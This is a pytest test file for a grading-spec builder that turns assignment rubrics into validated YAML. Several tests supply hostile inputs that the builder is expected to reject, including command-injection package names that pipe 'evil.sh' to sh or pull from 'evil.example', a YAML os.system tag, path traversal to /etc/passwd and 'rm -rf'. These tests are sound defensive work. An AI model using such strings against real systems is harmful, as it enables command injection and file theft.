import json

import pytest
import yaml

from markbook import specbuilder as sb
from markbook.spec import load_spec


def model(**kw):
    base = {"name": "Lab 1", "scale": 20, "language": "python",
            "criteria": [{"kind": "manual", "points": 5}]}
    base.update(kw)
    return base


ALL_KINDS = [
    {"kind": "files", "paths": "README.md\nsrc/*.py", "points": 2},
    {"kind": "readme", "sections": "installation, usage", "min_words": 50, "points": 2},
    {"kind": "history", "min_commits": 3, "min_active_days": 2, "points": 1},
    {"kind": "build", "run": "python -m py_compile main.py", "points": 3},
    {"kind": "output", "run": "python main.py", "points": 8,
     "cases": [{"name": "add", "args": "2 3", "expected": "5"}, {"stdin": "x", "expected": "X", "hidden": True}]},
    {"kind": "tests", "run": "", "min_tests": 3, "hidden": True, "points": 10},
    {"kind": "manual", "title": "Design", "guidance": "Naming.", "points": 5},
]


def ok(m, **kw):
    b = sb.build(m, **kw)
    assert b.ok, [(p.field, p.message) for p in b.problems]
    return b


# ── every check kind builds a spec the real validator accepts ─────────────────

def test_every_kind_together_builds_and_loads(tmp_path):
    b = ok(model(criteria=ALL_KINDS))
    assert b.total_points == 31 and b.needs_sandbox
    p = tmp_path / "spec.yaml"
    p.write_text(b.yaml)
    spec = load_spec(p)                                        # the CLI's own validator
    assert [c.type for c in spec.criteria] == ["file_exists", "readme", "git", "command", "cases", "junit", "manual"]
    assert spec.sandbox.image == "python:3.12-slim"


@pytest.mark.parametrize("kind", [k["kind"] for k in sb.KINDS])
def test_each_kind_alone(kind):
    item = next(dict(c) for c in ALL_KINDS if c["kind"] == kind)
    assert ok(model(criteria=[item])).spec["criteria"][0]["id"] == kind


def test_ids_are_readable_and_unique_for_repeated_manual_checks():
    b = ok(model(criteria=[{"kind": "manual"}, {"kind": "manual", "title": "Second"}, {"kind": "manual"}]))
    assert [c["id"] for c in b.spec["criteria"]] == ["manual", "manual-2", "manual-3"]


def test_single_use_kinds_cannot_be_added_twice():
    b = sb.build(model(criteria=[{"kind": "readme"}, {"kind": "readme"}]))
    assert any("only be added once" in p.message for p in b.problems)


def test_manual_only_rubric_needs_no_sandbox_and_no_prepare():
    b = ok(model())
    assert "sandbox" not in b.spec and "prepare" not in b.spec and not b.needs_sandbox


# ── languages, images, build dependencies ─────────────────────────────────────

@pytest.mark.parametrize("lang,image", [("python", "python:3.12-slim"), ("node", "node:20"), ("c", "gcc:13"),
                                        ("java", "eclipse-temurin:21")])
def test_language_picks_the_image(lang, image):
    assert ok(model(language=lang, criteria=[{"kind": "build", "run": "make"}])).spec["sandbox"]["image"] == image


def test_custom_image_is_required_and_validated():
    c = [{"kind": "build", "run": "make"}]
    assert any(p.field == "image" for p in sb.build(model(language="custom", criteria=c)).problems)
    for bad in ("python:3\nRUN curl evil", "has space", "-v /:/host", "a;b"):
        assert any(p.field == "image" for p in sb.build(model(language="custom", image=bad, criteria=c)).problems), bad
    assert ok(model(language="custom", image="ghcr.io/org/tool:1.2", criteria=c)).spec["sandbox"]["image"] == "ghcr.io/org/tool:1.2"


def test_compiled_languages_chain_run_and_tests_to_the_build_but_python_does_not():
    crit = [{"kind": "build", "run": "make"}, {"kind": "output", "run": "./prog", "cases": [{"expected": "1"}]}]
    c = ok(model(language="c", criteria=crit)).spec["criteria"]
    assert c[1]["requires"] == ["build"]
    p = ok(model(language="python", criteria=crit)).spec["criteria"]
    assert "requires" not in p[1]


def test_python_tests_get_a_fixed_pytest_prepare_step_and_nothing_user_controlled():
    b = ok(model(criteria=[{"kind": "tests", "run": "", "points": 5}]))
    assert b.spec["prepare"] == {"run": ["pip install --no-cache-dir pytest"], "timeout": 900}
    assert b.uses_prepare


def test_node_tests_need_no_prepare():
    assert not ok(model(language="node", criteria=[{"kind": "tests", "run": ""}])).uses_prepare


# ── extra packages: the only free text that can reach `prepare` ───────────────

def test_extra_packages_are_refused_unless_the_server_opted_in():
    b = sb.build(model(extra_packages="requests", criteria=[{"kind": "tests", "run": ""}]))
    assert any("--allow-prepare" in p.message for p in b.problems)


def test_extra_packages_when_allowed():
    b = ok(model(extra_packages="requests, flask==3.0.3", criteria=[{"kind": "tests", "run": ""}]), allow_packages=True)
    assert b.spec["prepare"]["run"] == ["pip install --no-cache-dir pytest requests flask==3.0.3"]


@pytest.mark.parametrize("bad", ["requests; curl evil.sh | sh", "$(id)", "a b", "x`id`", "pkg&&rm", "../../etc/passwd",
                                 "git+https://evil.example/x.git", "-r /etc/passwd", "--index-url=http://evil", "a\nb"])
def test_hostile_package_names_never_reach_the_command(bad):
    b = sb.build(model(extra_packages=bad, criteria=[{"kind": "tests", "run": ""}]), allow_packages=True)
    assert not b.ok and any(p.field == "extra_packages" for p in b.problems)
    assert b.yaml == "" and "evil" not in json.dumps(b.spec.get("prepare", {}))


def test_node_packages_and_node_path_for_commands():
    b = ok(model(language="node", extra_packages="express, @scope/pkg@1.2.3",
                 criteria=[{"kind": "build", "run": "node --check index.js"}]), allow_packages=True)
    assert b.spec["prepare"]["run"] == ["npm install --no-audit --no-fund express @scope/pkg@1.2.3"]
    assert b.spec["criteria"][0]["check"]["run"].startswith("NODE_PATH=/prepare/node_modules ")


def test_extra_packages_only_for_python_and_node():
    b = sb.build(model(language="c", extra_packages="x", criteria=[{"kind": "build", "run": "make"}]), allow_packages=True)
    assert any("Python and Node.js only" in p.message for p in b.problems)


# ── hostile text can't break out of the YAML ──────────────────────────────────

NASTY = ['a: b\nc: d', "# comment", 'quote " and \' mix', "!!python/object/apply:os.system ['id']", "{{7*7}}", "- list",
         "key: &anchor value", "*alias", "%YAML 1.1\n---", "tab\tinside", "emoji 🎓 é"]


@pytest.mark.parametrize("text", NASTY)
def test_hostile_text_round_trips_as_plain_strings(text):
    b = ok(model(name=text or "x", criteria=[{"kind": "manual", "title": text, "guidance": text},
                                              {"kind": "files", "paths": text}]))
    loaded = yaml.safe_load(b.yaml)                      # safe_load: no Python objects can be constructed
    assert isinstance(loaded["name"], str) and isinstance(loaded["criteria"][0]["title"], str)
    assert "!!python" not in b.yaml or "'" in b.yaml or '"' in b.yaml, "dangerous tags must be quoted data, not tags"
    assert set(loaded) <= {"name", "version", "scale", "pass_mark", "deadline", "late_penalty", "sandbox", "prepare", "criteria"}


def test_a_newline_in_a_command_is_flattened_and_cannot_add_yaml_keys():
    b = ok(model(language="c", criteria=[{"kind": "build", "run": "make\nprepare: {run: [evil]}"}]))
    loaded = yaml.safe_load(b.yaml)
    assert "prepare" not in loaded and "\n" not in loaded["criteria"][0]["check"]["run"]


# ── numbers, deadlines, penalties ─────────────────────────────────────────────

def test_defaults_and_bounds():
    assert ok(model(scale=None, criteria=[{"kind": "manual", "points": None}])).spec["scale"] == 20
    for field, value in (("scale", 0), ("scale", -5), ("scale", "abc")):
        assert any(p.field == field for p in sb.build(model(**{field: value})).problems), (field, value)
    assert any(p.field == "pass_mark" for p in sb.build(model(pass_mark=30)).problems)
    assert any("Points" in p.message for p in sb.build(model(criteria=[{"kind": "manual", "points": -1}])).problems)


def test_deadline_gets_its_utc_offset_and_late_penalty_needs_a_deadline():
    b = ok(model(deadline_local="2026-03-01T23:59", utc_offset="+01:00", late_percent_per_day=10, late_max_percent=50))
    assert str(b.spec["deadline"]) == "2026-03-01T23:59:00+01:00"
    assert b.spec["late_penalty"] == {"percent_per_day": 10, "max_percent": 50}
    assert any(p.field == "deadline_local" for p in sb.build(model(late_percent_per_day=10)).problems)
    for bad_date in ("tomorrow", "2026-13-40 99:99"):
        assert any(p.field == "deadline_local" for p in sb.build(model(deadline_local=bad_date)).problems)
    assert any(p.field == "utc_offset" for p in sb.build(model(deadline_local="2026-03-01 10:00", utc_offset="GMT+1")).problems)
    assert ok(model(deadline_local="2026-03-01 10:00", utc_offset="Z")).spec["deadline"].endswith("Z")


# ── test cases ────────────────────────────────────────────────────────────────

def test_cases_blank_rows_skipped_stdin_newline_added_hidden_and_compare_kept():
    b = ok(model(criteria=[{"kind": "output", "run": "python m.py", "compare": "tokens", "cases": [
        {"name": "", "stdin": "", "args": "", "expected": ""},                       # untouched row: skipped
        {"stdin": "3 4", "expected": "7"},
        {"name": "secret", "expected": "x", "hidden": True}]}]))
    check = b.spec["criteria"][0]["check"]
    assert check["compare"] == "tokens" and len(check["cases"]) == 2
    assert check["cases"][0] == {"name": "case 2", "stdin": "3 4\n", "stdout": "7"}
    assert check["cases"][1]["hidden"] is True


def test_cases_need_expected_output_and_at_least_one_case():
    assert any("expected output" in p.message for p in sb.build(model(criteria=[
        {"kind": "output", "run": "x", "cases": [{"stdin": "1"}]}])).problems)
    assert any("at least one test case" in p.message for p in sb.build(model(criteria=[
        {"kind": "output", "run": "x", "cases": []}])).problems)


# ── structure and limits ──────────────────────────────────────────────────────

def test_problems_carry_field_paths_for_the_form():
    b = sb.build({"name": "", "scale": 0, "criteria": [{"kind": "readme", "min_words": "many"}]})
    assert {"name", "scale", "criteria.readme.min_words"} <= {p.field for p in b.problems}
    assert b.yaml == ""


@pytest.mark.parametrize("bad", [None, [], "text", 3])
def test_non_object_models_are_rejected(bad):
    assert not sb.build(bad).ok


def test_unknown_kinds_empty_rubrics_and_oversized_rubrics():
    assert any("Unknown check" in p.message for p in sb.build(model(criteria=[{"kind": "rm -rf"}])).problems)
    assert any("at least one" in p.message for p in sb.build(model(criteria=[])).problems)
    many = [{"kind": "manual"} for _ in range(31)]
    assert any("Too many" in p.message for p in sb.build(model(criteria=many)).problems)


def test_paths_must_stay_inside_the_project():
    for bad in ("/etc/passwd", "../secrets", "a/../../b"):
        assert any("inside the project" in p.message for p in sb.build(model(criteria=[
            {"kind": "files", "paths": bad}])).problems), bad


def test_names_are_trimmed_and_control_characters_removed():
    b = ok(model(name="  Lab\x00 1\x07  " + "x" * 300))
    assert len(b.spec["name"]) <= 120 and "\x00" not in b.spec["name"] and b.spec["name"].startswith("Lab 1")


def test_slug_helper():
    assert sb.slug("Mon Premier Rubric!") == "mon-premier-rubric" and sb.slug("../../etc") == "etc"
    assert sb.slug("!!!") == "check" and len(sb.slug("a" * 100)) <= 40


def test_catalog_is_json_serialisable_and_complete():
    cat = json.loads(json.dumps(sb.catalog()))
    assert {k["kind"] for k in cat["kinds"]} == {"files", "readme", "history", "build", "output", "tests", "manual"}
    assert set(cat["languages"]) == {"python", "node", "c", "java", "custom"}
